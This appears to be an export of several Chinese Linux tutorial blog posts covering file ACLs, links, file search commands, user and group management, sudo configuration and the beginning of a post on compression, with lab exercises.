作用 -m 设置 acl 参数 -x 删除 acl 参数 -b 删除所有 acl 参数 -k 删除预设的 acl 参数 -R 递归设置 acl 参数 -d 设置『预设 acl 参数』只对目录有效 , 在该目录新建的数据会引用 命令格式 : 1234『 u:[ 使用者账号列表 ]:[ rwx] 』 &lt;= = 针对特定用户『 g:[ 群组列表 ]:[rwx] 』 &lt;= = 针对特定用户组『 m:[ rwx] 』 &lt;= = 针对有效权限 mask『 d:[ ug]: 使用者列表 :[ rwx] 』 针对预设权限 , 属性将继承到次目录 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950[root@rhel7 tmp]# setfacl -m u:student:rwx file1[root@rhel7 tmp]# setfacl -m g:student:rw file1[root@rhel7 tmp]# getfacl file1 file: file1 owner: root group: rootuser::rw-user:student:rwxgroup::r--group:student:rw-mask::rwxother::r---d 针对预设权限 , 属性将继承到次目录[root@rhel7 tmp]# mkdir dabao[root@rhel7 tmp]# setfacl -d -m u:student:rwx dabao[root@rhel7 tmp]# getfacl dabao file: dabao owner: root group: rootuser::rwxgroup::r-xother::r-xdefault:user::rwxdefault:user:student:rwxdefault:group::r-xdefault:mask::rwxdefault:other::r-x[root@rhel7 tmp]# ll dabao -ddrwxr-xr-x+ 2 root root 6 Jun 22 15:09 dabao[root@rhel7 tmp]# touch dabao/kk[root@rhel7 tmp]# ll dabaototal 4-rw-rw-r--+ 1 root root 0 Jun 22 15:10 kk[root@rhel7 tmp]# getfacl dabao/kk file: dabao/kk owner: root group: rootuser::rw-user:student:rwxeffective:rw-group::r-xeffective:r--mask::rw-other::r-- 切换为 student 用户[student@rhel7 tmp]$ cd dabao[student@rhel7 dabao]$ lltotal 4-rw-rw-r--+ 1 root root 0 Jun 22 15:10 kk[student@rhel7 dabao]$ cat kk 文件存储结构Linux 操作系统的文件权限 (rwx) 与文件属性 ( 拥有者、群组、 时间参数等 ) , 文件系统会将这两部分的数据分别存放在不同的区块 , 权限不属性放置到 inode 中 , 实际数据则放置到 data block 区块中。另外 , 还有一个超级区块 (superblock) 会记录整个 文件系统的整体信息 , 包括 inode 和 block的总量、使用量、剩余量等。 文件的属性和权限数据 –&gt; 放置到 inode 4 号 文件数据的实际放置点为 2, 7, 13, 15 这四个 block 号码 对于目录: inode 记录该目录的相关权限与属性 , 并记录分配到的那块 block 号码 ; 而 block 则是记录在该目录下的文件或目录的文件名和对应的 inode 号的数据。如下图所示: 软硬方式链接在 Linux 系统中的 ln 命令能够让用户创建出两种不同类型的文件快捷方式,一定要注意区分: 硬链接 (hard link) 可以被理解为一个 “ 指向原始文件 inode 的指针 ” ,系统不为它分配独立的 inode与文件,所以实际上来讲硬链接文件与原始文件其实是同一个文件,只是名字不同。于是每添加一个硬链接,该文件的 inode 连接数就会增加 1 ,直到该文件的 inode 连接数归 0 才是彻底删除。概括来说因为硬链接实际就是指向原文件 inode 的指针,即便原始文件被删除依然可以通过链接文件访问,但是不能跨文件系统也不能链接目录文件。 软链接也称为符号链接( symbolic link )即 “ 仅仅包含它索要链接文件的路径名 ” 因此能做目录链接也可以跨越文件系统,但原始文件被删除后链接文件也将失效,如同 WinodwTM 中的 “ 快捷方式 ” 。 ln 命令用于创建链接文件,格式为: “ ln [ 选项 ] 目标 ” 。 创建硬链接 :“ln 文件名 链接名 ” 创建软链接 :“ln -s 文件名 连接名 ” 参数 作用 -s 创建”符号链接”(默认是硬链接) -f 强制创建文件或目录的链接 -i 覆盖前先询问 -v 显示创建链接的过程 1234567891011[root@rhel7 tmp]# echo this is a &gt; file[root@rhel7 tmp]# cat filethis is a[root@rhel7 tmp]# ll file-rw-r--r--. 1 root root 10 Jun 22 16:02 file[root@rhel7 tmp]# ln file fileh[root@rhel7 tmp]# ll file fileh[root@rhel7 tmp]# ll file fileh files -i52973928 -rw-r--r--. 2 root root 10 Jun 22 16:02 file52973928 -rw-r--r--. 2 root root 10 Jun 22 16:02 fileh52973930 lrwxrwxrwx. 1 root root 4 Jun 22 16:03 files -&gt; filefile 指令和文件的搜索which whereis locate find 肉眼查找 : ls -R1234567891011121314151617181920212223242526272829[ root@www ~]# ls -R /tmp/tmp:dabaodabao1/tmp/dabao1:1/tmp/dabao1/1:2/tmp/dabao1/1/2:### 指令的搜寻 :whichwhich [ -a] command选项与参数 :-a- : 将所有由 PATH 目录中可以找到的指令均列出- : 只显示第一个找到的注意 :1. 系统内建命令找不到 , type 查看2. alias 命令别名​```shell[ root@www ~]# which cat/bin/cat[ root@www ~]# which postfix/usr/sbin/postfix 文件名的搜寻 :whereis, locate, findwhereiswhereis [ -bmsu] [ -BMS directory…-f] filename.. 参数 作用 -b 只寻找 binary 二进制 格式的文件 -m 只寻找在 说明文件 manual 路径下的文件 -s 只寻找 source 来源的文件 -u 搜寻不在上述三个项目当中的其他特殊文件 -l 查看 whereis 可搜寻的路径 123456[ root@www ~]# whereis /etc/passwdpasswd: /usr/bin/passwd /etc/passwd.OLD /etc/passwd /usr/share/man/man1/passwd.1.gz/usr/share/man/man5/passwd.5.gz[ root@www ~]# whereis manman: /usr/bin/man /etc/man.config /usr/share/man /usr/share/man/man7/man.7.gz/usr/share/man/man1p/man.1p.gz /usr/share/man/man1/man.1.gz locatelocate [ -ir] keyword 参数 作用 -i 忽略大小写的差异 ; -r 后面可接正规表示法的显示方式 安装软件 mlocate 之后才会有 updatedb 命令和 locate 命令,最小化安装的 rhel 系统默认不安装。 locate 寻找的数据是由『已建立的数据库 /var/lib/mlocate/mlocate.db 里面的数据所搜寻到 , 所以不用直接在去硬盘中存取数据 , 速度快 updatedb: 根据 /etc/updatedb.conf 的设定去搜寻系统硬盘内的文件名 , 并更新/var/lib/mlocate.mlocate.db PRUNEPATHS = &quot;/afs /media /net /sfs /tmp /udev /var/cache/ccache /var/spool/cups /var/spool/squid /var/tmp&quot; &lt;== 设定了不搜寻的目录 findfind [ PATH] [ option] [ action] 选项与参数 : 与时间有关 :-atime, -ctime ,-mtime , 以 -mtime 说明 -mtime n -mtime +n -mtime -n -newer file : 列出比 file 还要新的档案 123456789if n= 2 now= 2015/12/24then-mtime 2: 2015/12/22 当天内容改过的文件-mtime +2: 2 天之前 , 2015/12/22 之前被容被改过的文件 , 及 21\\20\\19...-mtime -2: 2 天以内 , 2015/12/24 和 2015/12/23 号修改过的文件&lt;--|--|--|--|--|--|--|--|--|--|--|2-|--|--|&lt;----------------------------+2-&gt;|--|--|--|&lt;--|--|--|--|--|--|--|--|--|--|--|--|&lt;-2-&gt;|11 12 13 14 15 16 17 18 19 20 21 22 23 24 现在 与用户和组有关 -uid n -gid n -user name -group name -nouser -nogroup 12345[ root@www ~]# find /tmp -user dabao/tmp/dabao/tmp/dabao1/tmp/dabao1/1/tmp/dabao1/1/2 与档案的权限及名称有关 -name filename: 搜寻文件名为 filename 的文件 ; -size [ +-]SIZE: SIZE 的规格有 c: 代表 byte k: 代表 1024bytes w: 字数 , 占两个字符 M\\G -type TYPE:f 普通文件 d 目录 l 链接文件 -perm mode : 文件权限『刚好等于』 mode 的档案 mode 范围 : 7777 ~ 0000 -perm -mode: 文件权限『必须要全部囊括 mode 权限』 -perm +mode: 文件权限『包含 mode 权限』的文件 123456789101112131415[ root@www ~]# find /tmp -name &quot;*da*&quot;/tmp/dabao/tmp/orbit-root/linc-bd3-0-5dc8fa181da/tmp/orbit-root/linc-da1-0-76ab0a1c521dd/tmp/orbit-root/linc-cc4-0-c0fda335ced5/tmp/dabao1[ root@www ~]# find /tmp -type f/tmp/pulse-BzLrQ7uHulwz/pid/tmp/.X0-lock/tmp/dabao/tmp/orbit-root/bonobo-activation-server-23d28d39cfff8983f6cac2ca00000055-ior/tmp/orbit-root/bonobo-activation-register-23d28d39cfff8983f6cac2ca00000055.lock/tmp/lurakm9.tmp/luraktg.tmp/tmp/lurakm9.tmp/lurakt2.tmp/tmp/lurakm9.tmp/lurakvs.tmp 额外动作 -exec [ 命令 ] : 后面可再接额外的命令来处理搜寻到的结果 find / -perm +7000 -exec ls -l {} \\;&lt;= = 固定格式 : find [ 路径 参数 ] -exec [ 命令 ] {} \\; -ok 格式同-exec，区别ok会带提示（交互式的找到后是否执行该命令） -print: 将结果输出屏幕上 , 预设动作 1234[ root@www ~]# find /tmp -name &quot;dabao*&quot; -exec ls -l {} \\;-rwxrwxrwx+ 1 dabao dabao 0 Mar 21 06:09 /tmp/dabaototal 4drwxr-xr-x. 3 dabao dabao 4096 Mar 21 06:11 1 Linux 文件和目录作业UGO 权限作业 查看 /var/spool/mail 下所有文件 , 并指出其拥有者和所属组分 别是谁 , 其拥有者和所属组对应的权限分别是什么 ? 在 /tmp/ 目录下创建 7 个目录 , 目录名分别为 test1 到 test7 1) 将该 7 个目录的拥有者改为 student 用户。 2) 在这 7 个目录下分别创建 file1 和 file2 3) 针对这 7 个目录的 student 用户分别设置数字为 1 到 7 的权限。 4) 分别对这个 7 个目录执行以下命令 :123456ls file1ls -l file1cd testxtouch file3rm file2chmod 777 file1并总结结论。 新建一个组 , 组名为 group, 要求将 test1 目录的所属组改为 group 组 , 并将 test1 目录下的所有文件的所属组都改为 group 组。 特殊权限作业 在 /tmp/ 目录下创建一个 testdir 目录 , 要求任何人在该目录下 创建的文件都只能由自己或者目录拥有者去删除 , 其余人不能够 去删除。 创建一个文件 , 让任何人执行这个文件时候 , 临时拥有文件拥 有者的权限。 ATTR 权限作业 创建一个文件 , 文件名任意 , 要求 , 该文件的访问时间不被 修改 , 同时 , 该文件只能被追加内容 , 不允许被修改和删除。 取消该文件的 Attr 权限。 ACL 权限作业 在 /tmp 下创建一个 file 文件 , 要求 student 用户对 file 有完整 的权限 ,kevin 用户对file 有 rw- 的权限 ,carol 用户对 file 有 -wx 的权限 ,natasha 用户对该文件有 r– 的权限。 清空 file 的 attr 权限。","link":"/2016/12/22/booboo_linux_base/03-Linux-file/"},{"title":"Linux 用户和组","text":"课堂作业 添加2个组，一个组名为justice，另外一个组名为ninja。 添加4个新用户，分别为 superman、batman、wonderwoman、greenlantern，密码均为uplooking；其附加组为justice。 添加4个新用户，分别为 leo、raph、mikey、don ，密码均为uplooking，其附加组为ninja。 mikey用户总是在系统里搞破坏，root决定封他的号，让他不能登陆。过了几天，再解封。 leo想加入justice，root同意了，将justice作为附加组添加给leo。 don整天搞创造，root要求他的密码要更安全，所以将他的密码设置成7天之后要换密码，并且密码过期前3天要提醒他，如果密码过期后2天还没有设置新密码，那么就封锁don账户。 batman总是喜欢修改密码，没事就在修改密码，而使用该batman账户的人有好几个，比如蝙蝠侠，蝙蝠侠的管家，蝙蝠侠的助手罗宾等等。所以root决定将batman账户的密码的最小存活期改为10天。也就是说10天之内batman账户不能修改密码。 leo想退出justice,root帮他设置一下。 superman想把密码改为uplooking123，让他自己改。发现改不了，密码太简单了，自己去想一个复杂的密码。 让superman能够修改root用户的密码。 用户和组的相关文件 文件名 作用 /etc/passwd 系统中的账号信息 etc/shadow 存放密码及其策略相关信息 /etc/group 存放用户组的信息 /etc/gshadow 存放用户组的密码及其策略相关信息 /etc/default/useradd 创建新用户时默认的配置信息 /etc/skel/* Directory containing default files. /etc/login.defs 用户和组默认的配置信息 /etc/shells 该文件记录着合法的 shell 版本 /etc/passwd每一行都代表一个账号 , 有几行就代表有几个账号在你的系统中 系统统账号: bin, daemon, adm, nobody 以“：”作为分隔符,七个字段 root:x:0:0:root:/root:/bin/bash 账号名称 :root 密码 :X UID: 使用者标识符rhel6 root_uid=0 sys_uid=1-499 user_uid=500-65535 ( 2^32-1 )rhel7 root_uid=0 sys_uid=201-999 user_uid=1000-65535 GID: 用户组标识符 root_guid=0 用户信息说明栏 家目录 : 用户的家目录 root 的家目录在 /root, 默认用户的家目录在 /home/yourname Shell: 命令解释器 系统默认为 /bin/bash /sbin/nologin 不可通过终端登录系统 /etc/shadow存放密码及其策略相关信息 以“：”作为分隔符九个字段 root:$1$/30QpE5e$y9N/D0bh6rAACBEz.hqo00:14126:0:99999:7::: 账号名称 :root 密码 : 加密后的字符串，以$N$ 开头 最近变更密码的日期 : 天数,以 1970 年 1 月 1 日作为 1 而累加的日期echo $(($(date –date=”2008/09/04” +%s)/86400+1))14126 密码不可被更改的天数 :0 : 表示密码随时可以更改， 20 :表示 距最近一次修改密码20 天之内都不能修改密码 密码需要重新变更的天数 :99999 ( 计算为 273 年 ) 表示密码的变更没有强制性。 密码需要变更期限前的警告天数 : 在密码到期之前几天提醒 密码过期后的账号宽限时间 ( 密码失效日 ): 密码过期特性。 账号失效日期 : 天数，以 1970 年 1 月 1 日作为 1 而累加的日期 保留 : 保留段 /etc/group存放用户组的信息 每一行代表一个群组以“：”作为分隔符四个字段 root:x:0:root 组名 :root 群组密码 :x 一般不设定,通常是给『群组管理员』使用 GID: 群组的 ID 此群组支持的账号名称 : 一个账号可以加入多个群组 例如,将 dabao 加入 root 群组后 :1root:x:0:root,dmtsai /etc/gshadow存放用户组的密码及其策略相关信息 每一行代表一个群组 “: ” 作为分隔符四个字段 newgroup:!::redhat 组名 :newgroup 密码栏 : 开头为 ! 表示无合法密码 , 所以无群组管理员 群组管理员的账号 此群组支持的账号名称 : 与 /etc/group 相同 /etc/default/useradd创建新用户时默认的配置信息1234567GROUP=100 &lt;== 预设的群组，现已不生效，如果创建用户时不指定群组，则使用与用户同名的群组HOME=/home &lt;== 默认的家目录所在目录INACTIVE=-1 &lt;== 密码失效日 , 在 shadow 第 7 栏EXPIRE= &lt;== 账号失效日 , 在 shadow 第 8 栏SHELL=/bin/bash &lt;== 预设的 shell /sbin/nologin 将无法登陆SKEL=/etc/skel&lt;== 用户家目录的内容数据参考目录CREATE_MAIL_SPOOL=yes &lt;== 是否主动帮助使用者建立邮件信箱 (mailbox) /etc/skel/Directory containing default files. .bash_logout .bash_profile .bashrc .gnome2 .mozilla 12345678910[root@rhel7 skel]# ll -a /etc/skeltotal 40drwxr-xr-x. 4 root root 4096 Jan 2 01:58 .drwxr-xr-x. 125 root root 12288 Mar 21 03:09 ..-rw-r--r--. 1 root root 18 Jul 9 2013 .bash_logout-rw-r--r--. 1 root root 176 Jul 9 2013 .bash_profile-rw-r--r--. 1 root root 124 Jul 9 2013 .bashrc-rw-r--r--. 1 root root 500 May 7 2013 .emacsdrwxr-xr-x. 2 root root 4096 Jul 14 2010 .gnome2drwxr-xr-x. 4 root root 4096 Jan 2 01:52 .mozilla /etc/login.defs默认的配置信息 rhel6 下的信息12345678910111213MAIL_DIR /var/spool/mail 用户默认邮件信箱放置目录PASS_MAX_DAYS 99999 /etc/shadow 第 5 栏 , 密码需要重新变更的天数PASS_MIN_DAYS 0 /etc/shadow 第 4 栏 , 密码不可被更动的天数PASS_MIN_LEN 5 密码最短的字符长度 , 已被 pam 模块取代 , 失去效用 !PASS_WARN_AGE 7 /etc/shadow 第 6 栏 , 过期前会警告天数UID_MIN 500 使用者最小的 UID 不能 &lt;500UID_MAX 60000 使用者最大的 UID 不能 &gt;60000GID_MIN 500 自定义组最小的 UID 不能 &lt;500GID_MAX 60000 自定义组最大的 UID 不能 &gt;60000CREATE_HOME yes 在 username 命令不加 -M 及 -m 时 , 是否主动建立用户家目录UMASK 077 用户家目录建立的 umask , 因此权限会是 700 『 drwx------ 』USERGROUPS_ENAB yes 使用 userdel 时 , 是否会删除初始群组(如果使用 userdel 去删除一个账号时 , 该账号所属的初始群组已经没有人隶属于该群组了 , 那举就删掉该群组)ENCRYPT_METHOD SHA512 经过 SHA512 进行加密处理 /etc/shells该文件记录着合法的 shell 版本1234567[root@rhel7 skel]# cat /etc/shells/bin/sh/bin/bash/sbin/nologin/bin/dash/bin/tcsh/bin/csh 用户和组的相关命令 用户和组 新建组 groupadd 新建用户 useradd 修改密码 passwd 密码 &gt;8 位字符、小写 / 大写 / 数字 / 特殊符号之间任选 3 位 修改用户属性 usermod 修改组属性 groupmod 修改密码属性 chage 修改 shell chsh 删除用户 userdel 删除组 groupdel 查看已存在用户的基本信息 id 查看当前用户支持的群组信息 groups 通过文件查看1234/etc/passwd/etc/shadow/etc/group/etc/gshadow 新建用户和组groupadd123456789101112groupadd 创建组-g, --gid GID-r, --system Create a system group 新建组 test 制定 gid 为 888[root@rhel7 ~]# groupadd -g 888 test 新建一个系统组 baby[root@rhel7 ~]# groupadd -r baby 查看一下刚刚新建的组的信息[root@rhel7 ~]# tail -n 2 /etc/grouptest:x:888:baby:x:490: useradd123456789101112创建新用户useradd [-u UID] [-g 初始群组 ] [-G 次要群组 ] [-mM] [-c 说明栏 ] [-d 家目录绝对路径 ] [-s shell] 账号名拓展: -e : 接日期『 YYYY-MM-DD 』 shadow 第八字段账号失效日期 -f : 接天数 shadow 第七字段密码失效日 0 :立刻失效 -1 :永不失效 失效后可登陆,但是会强制你重新设置密码[root@rhel7 ~]# useradd -u 888 -g 888 -f 0 -e 2016-03-21 t1[root@rhel7 ~]# id t1uid=888(t1) gid=888(test) groups=888(test)[root@rhel7 ~]# tail -n 1 /etc/passwdt1:x:888:888::/home/t1:/bin/bash[root@rhel7 ~]# tail -n 1 /etc/shadowt1:!!:16880:0:99999:7:0:16881: passwd123456789101112给用户设置密码passwd [--sdtin] &lt;== 所有人均可使用更改自己的密码passwd [-l] [-u] [--sdtin] [-S] [-n 日数 ] [-x 日数 ] [-w 日数 ] [-i 日期 ] 账号 &lt;==root 功能选项与参数 :--stdin : 可以透过来自前一个管线的数据 , 作为密码输入 echo 123 | passwd --stdin dabao-l : 是 Lock 的缩写 , 会将 /etc/shadow 第二栏最前面加上 ! 使密码失效-u : 与 -l 相对 , 是 Unlock 的缩写-S : 列出密码相关参数 shadow 大部分信息。-n : 后面接天数 ,shadow 第 4 字段 , 密码不可被更动的天数-x : 后面接天数 ,shadow 第 5 字段 , 密码需要重新变更的天数-w : 后面接天数 ,shadow 第 6 字段 , 密码需要变更期限前的警告天数-i : 后面接天数 ,shadow 第 7 字段 , 密码失效日期 12345678910111213141516171819202122[root@rhel7 ~]# passwd t1Changing password for user t1.New password:BAD PASSWORD: it is based on a dictionary wordRetype new password:passwd: all authentication tokens updated successfully. 设置密码失效日期为 7 天[root@rhel7 ~]# passwd -i 7 t1Adjusting aging data for user t1.passwd: Success 查看记录用户密码属性的文件 /etc/shadow ,截取 t1 用户的那一行[root@rhel7 ~]# sed -n &apos;/t1/p&apos; /etc/shadowt1:$6$TDnycU/C$0AmM5AoZmoHZQMex.dQCoroH2JxdSnDhLnBMorcUPlWgshYrlstZJmH.Q.fTOTV.pECGEuqFqugj8YccRqcdD/:16880:0:99999:7:7:16881: 截取 t1 用户密码属性,以 : 为分割的第 7 字段[root@rhel7 ~]# sed -n &apos;/t1/p&apos; /etc/shadow|cut -d&quot;:&quot; -f 77[root@rhel7 ~]# sed -n &apos;/t1/p&apos; /etc/shadow|awk -F: &apos;{print 7}&apos;7 修改用户和组属性groupmod修改组属性 12345678groupmod -g gid [gname] 修改 gidgroupmod -n new_gname [gname] 修改组的名字[root@rhel7 ~]# groupmod -g 999 test[root@rhel7 ~]# grep test /etc/grouptest:x:999:[root@rhel7 ~]# groupmod -n test1 test[root@rhel7 ~]# grep test /etc/grouptest1:x:999: usermod修改用户属性1234567891011121314usermod [-cdegGlsuLU] username选项不参数 :-c : 后面接账号的说明 修改 /etc/passwd 第 5 字段-d : 后面接账号的家目录 修改 /etc/passwd 第 6 字段-e : 后面接日期 , 格式是 YYYY-MM-DD 修改 shadow 第 8 字段 ( 账号失效日 )-f : 后面接天数 修改 shadow 第 7 字段 ( 密码失效日期 )-g : 后面接初始群组 修改 /etc/passwd 第 4 字段 GID-G : 后面接次要群组 , 修改这个使用者能够支持的群组 修改 /etc/group-aG : 『增加次要群组的支持』而非『设定』-l : 后面接账号名称 修改账号名称 修改 /etc/passwd 第 1 字段-s : 后面接 Shell 的实际档案 , 例如 /bin/bash /bin/csh 等等-u : 后面接 UID 数字啦 ! 卲 /etc/passwd 第三栏的资料 ;-L : 暂时将用户的密码冻结 , 让他无法登入。修改 /etc/shadow 密码栏-U : 将 /etc/shadow 密码栏的 ! 拿掉 , 解冻 12345678[root@rhel7 ~]# usermod -g test2 -G test3 t1[root@rhel7 ~]# id t1uid=888(t1) gid=1000(test2) groups=1000(test2),1001(test3)[root@rhel7 ~]# usermod -s /sbin/nologin t1[root@rhel7 ~]# grep t1 /etc/passwdt1:x:888:1000::/home/t1:/sbin/nologin[root@rhel7 ~]# su - t1This account is currently not available. chage修改用户密码属性 123456789chage [-ldEImMW] 账号名选项与参数 :-l : 列出该账号的详细密码参数 ;-d : 后面接日期 , 修改 shadow 第 3 字段 ( 最近一次更改密码的日期 ), 格式 YYYY-MM-DD-m : 后面接天数 , 修改 shadow 第 4 字段 ( 密码不可被更动的天数 )-M : 后面接天数 , 修改 shadow 第 5 字段 ( 密码需要重新变更的天数 )-W : 后面接天数 , 修改 shadow 第 6 字段 ( 密码需要变更期限前的警告天数 )-I : 后面接天数 , 修改 shadow 第 7 字段 ( 密码失效日期 )-E : 后面接日期 , 修改 shadow 第 8 字段 ( 账号失效日 ), 格式 YYYY-MM-DD 123456789[root@rhel7 ~]# chage t1Changing the aging information for t1Enter the new value, or press ENTER for the defaultMinimum Password Age [0]:Maximum Password Age [99999]:Last Password Change (YYYY-MM-DD) [2016-03-20]:Password Expiration Warning [7]:Password Inactive [7]:Account Expiration Date (YYYY-MM-DD) [2016-03-21]: chshchange shell 的简写 123456789chsh [-ls]选项与参数 :-l : 列出目前系统上面可用的 shell /etc/shells 里内容-s : 修改自己的 Shell[root@rhel7 ~]# chsh -s /bin/bash t1Changing shell for t1.Shell changed.[root@rhel7 ~]# grep t1 /etc/passwdt1:x:888:1000::/home/t1:/bin/bash 删除用户和组groupdel删除组 groupdel groupname userdel删除用户 1234567891011121314151617181920userdel [-r] username选项不参数 :-r 没有这个选项删除会不彻底,关于用户的目录、文档全部删除[root@rhel7 ~]# tail -3 /etc/grouptest:x:999:test2:x:1000:test3:x:1001:t1[root@rhel7 ~]# groupdel test3[root@rhel7 ~]# tail -3 /etc/groupbaby:x:490:test:x:999:test2:x:1000:[root@rhel7 ~]# userdel -r t1[root@rhel7 ~]# ll /hometotal 12drwx------. 27 cong cong 4096 Jan 1 18:40 congdrwx------. 4 g2888 4096 Mar 21 03:56 g2drwx------. 12 tom tom 4096 Mar 21 02:14 tom 查看用户和组信息id查看已存在用户的基本信息 123456[root@rhel7 ~]# id rootuid=0(root) gid=0(root) groups=0(root)[root@rhel7 ~]# id -g root0[root@rhel7 ~]# id -u root0 groups查看当前用户支持的群组信息 12[root@rhel7 ~]# groupsroot 思考题: root 和普通用户都可以修改 /etc/passwd 文档,那么这个文档的权限是什么呢?SUID 用户身份切换 sudo / susu123456su [-lm] [-c 指令 ] [username]选项与参数 :- : 单纯使用 - 如『 su - 』 以 login-shell 变量档案读取方式登入系统 ; 默认切换为 root-l : 与 - 类似 login-shell-m :-m 与 -p 一样 , 表示『使用目前的环境设定 , 而不读取新使用者的配置文件』-c : 接指令 总结: su - username 或 su -l username完整切换成新使用者的环境 用 env 查看环境变量PATH/USER/MAIL su - -c “ 指令 “仅想要执行一次 root 的指令 使用 root 切换成为任何使用者时 , 不需要输入新用户密码 缺点:当主机多人管理时, su 切换成 root ,那每个人都需要知道 root 密码,不安全。 sudosudo [-u user name | #uid] [command] sudo 执行流程 在 /etc/sudoers 档案中查看 user 是否有 sudo 执行权限 若有 sudo 执行权限 , 『输入用户的密码』 密码正确 , 开始执行 sudo 后续接的指令 root 无需密码,自己切换自己也无需密码 添加用户 sudo 执行权限的方法(如何让用户可以使用 sudo ?) visudo 可以让系统检验 /etc/sudoers 的语法是否正确 修改 /etc/sudoers 中的语法 1 )单一用户可使用 root 所有指令或某些指令 123root ALL=(ALL) ALL &lt;== 找到这一行 ,rh6 在 98 行username ALL=(ALL) ALL &lt;== 新增这一行username ALL=(root) /bin/touch&lt;== 新增这一行 语法解释: 使用者账号 登入者的来源主机名 =( 可切换的身份 ) 可下达的指令 root ALL=(ALL) ALL &lt;== 这是默认值 使用者帐号:系统哪个帐号可以使用 sudo 登入者的来源主机名:信任用户 默认 root 可来自任何一部网络主机 可切换的身份:该账号可以切换成谁来下命令 , 末日 root 可以切换成任何人 可下达的指令:可用该身份下达什么指令。必需使用绝对路径 ( 可通过 which\\whereis 查询 ) ALL : 是特殊关键词 , 代表任何身份、任何主机、任何命令 2 )群组和免密码的功能处理 12%wheel ALL=(ALL) ALL&lt;== 找到这一行 ,rh6 在 105 行%wheel ALL=(ALL) NOPASSWD: ALL&lt;== 找到这一行 ,rh6 在 108 行 语法解释: % 接群组 wheel 群组内的用户有使用 sudo 的权限,并可以切换成任何人,执行切换后身份的任何命令 wheel 群组内的用户切换用户时不需要输入自己的密码 3）有限的权限操作 123dabao ALL=(root) /usr/bin/passwd &lt;== 有 bug , dabao 能修改 root 密码dabao ALL=(root) !/usr/bin/passwd, /usr/bin/passwd [A-Za-z]*,!/usr/bin/passwd root&lt;== 可以执行『 passwd 任意字符』 , 但是『 passwd 』和『 passwd root 』这两个命令不可执行 4 )别名设置 visudo 123User_Alias DABAO=dabao,jerry,tom,g1,g2,g3Cmnd_Alias DABAOCOM = !/usr/bin/passwd,/usr/bin/passwd [A-Za-z]*,!/usr/bin/passwd rootDABAO ALL=(root) DABAOCOM 5) sudo 搭配 su 使用 12username ALL=(root) /bin/su -sudo su - &lt;==sudo -u root su -l root可以直接切换成 root 用户,而且不需要输入 root 密码 6 ) 5 分钟内可以不用再输入密码。 Linux用户和组课后作业 新建一个用户名为 redhat。密码为 password ，配置以下信息,以达到要求: 密码的最小存活期为:1 天 密码的最大存活期为:10 天 密码过期前 5 天提醒 密码过期后如 15 天仍未设置新密码,则封锁该帐户。 创建一个新组 newgroup、将 redhat 以附加组成员的身份加入 到 newgroup 中。 添加 3 个用户,用户 harry,natasha,tom,和一个组 ,组名为 admin 组 ，要求 ： harry,natasha 用户的附加组为 admin 组； tom 用户的登陆 shell 为非交互式 shell； 用户密码都为 uplooking 使用 harry 用户登陆系统,尝试修改自己的密码,密码自己设 定。 创建一个叫做 alex 用户,用户 uid 为 1234,不能登陆系统。 以 root 用户身份给 natasha 用户修改密码,密码修改为 abc12345。 给 tom 用户追加附加组,追加的附加组为 alex,同时给 tom 用户修改 uid,修改为 2222。","link":"/2016/12/22/booboo_linux_base/02-Linux-user-and-group/"},{"title":"Linux 压缩打包","text":"压缩的意义和原理压缩的意义你是否遇到过以下情况： 文件太大, 一个 u 盘无法全部复制? 备份某些重要数据 , 偏偏这些数据量太大了 , 耗掉了你太多的磁盘空间? 这个时候，“文件压缩”技术可 就派上用场了 ! 因为这些比较大型的文件透过所谓的文件压缩技术后 , 可以将他的磁盘使用量降低 , 可以达到减低文件容量的效果 , 此外 , 有的压缩程序还可以进行容量限制 , 使一个大型文件可以分割成为数个小型文件 , 以方便 U盘携带呢 ! 压缩的原理目前我们使用的计算机系统中都是使 bytes(字节)单位来计量的! 事实上 , 计算机最小的计量单位应该是 bits (比特)。 1 byte = 8 bits 。 如果让计算机记录 1 这个数字他会如何记录 ? 假设一个 byte 可以看成下面的样子 : □□□□□□□□ Tips: 1 byte = 8 bits , 所以每个 byte 当中会有 8 个空格 , 而每个空格可以是 0, 或者 1 , 这里仅是做为一个粗略的介绍。由于我们记录数字是 1 , 表示成二进制就是 00000001 , 1 会在最右边占据 1 个 bit , 而其他 的 7 个bits 将会被填上 0 ! 有一种压缩技术示这么做的,他是将重复的数据进行统计记录的。 举个例子说 , 如果你的数据『 111…. 』共有 100 个 1 那么压缩技术会记录为『 100 个 1 』而不是真的有 100 个 1 的位存在 ! 简单的说 , 你可以将他想成 , 其实文件里面有相当多的『空间』存在 , 并不是完全填满的 『压缩』 技术就是将这些『空间』填满 , 以让整个文件占用的容量下降 ! 『压缩过的档案』并无法直接被我们的操作系统所使用 , 因此 , 若要使用这些被压缩过的文件数据 , 则必项将他『还原』回到 未压缩前的模样 ,那就是所谓的『解压缩』啰 ! 至于压缩前与压缩后的档案所占用的磁盘空间大小 , 就可以被称为是『压缩比』。 压缩与解压缩的好处最大的好处就是压缩过的文件容量变小了 , 所以你的 硬盘容量无形当中就可以容纳更多的资料。此外 , 在一些网络数据的传输中 , 也会由于数据量的降低 , 好让网络带宽可以用来作更多的工作 ! 而并是老是卡在一些大型的文件传输上面呢 ! 目前很多的 WWW 网站也是利用文件压缩的技术来进行数据的传送 , 好让网站带宽的可利用率上升。 压缩打包命令命令概览 compress 是一个相当古老的 unix 档案压缩指令。 gzip 是 GNUzip 的缩写,它是一个 GNU( 全称是 GNU’s Not Unix ) 自由软件的文件压缩程序 ; 由于 gzip 可以产生更理想的压缩比例,一般人多已改用 gzip 为档案压缩工具。 bzip2 是一个基于 Burrows-Wheeler 变换的无损压缩软件,压缩效果比传统的 LZ77/LZ78 压缩算法来得好 ; 若说 gzip 是为了取代 compress 并提供更好的压缩比而成立的,那么 bzip2 则是为了取代 gzip 并提供更佳的压缩比而来的。 bzip2 这玩意的压缩比竟然比 gzip 还要好。 tar 命令最初的设计目的是将文件备份到磁带上 (tape archive) ,因而得名 tar 。 .zip.zip 扩展名表示文件是使用许多 zip 归档程序和压缩程序之一(但不是 gzip )创建的。因为这是一种非常流行的压缩格式,算法的详细描述也有很多,所以可以找到用于所有操作系统的有用的移植形式。这包括创建和扩展带有 .zip 文件扩展名的档案的压缩和解压缩实用程序。在 Linux 上有两种这样的工具: 免费的 Info-ZIP 和以赢利为目的的 PKZIP for Linux 。 如果您只是偶尔需要创建或打开 zip 文件,使用 Info-ZIP 。如果希望使用在 MS-DOS 或其它系统上使用的相同工具,请选择PKZIP ( PKZIP 可用于许多操作系统)。用于微软 Windows 的 WinZIP 和用于 Mac OS 的Stufflt 这两种实用程序可以创建和打开相互之间兼容的档案。 Info-ZIP 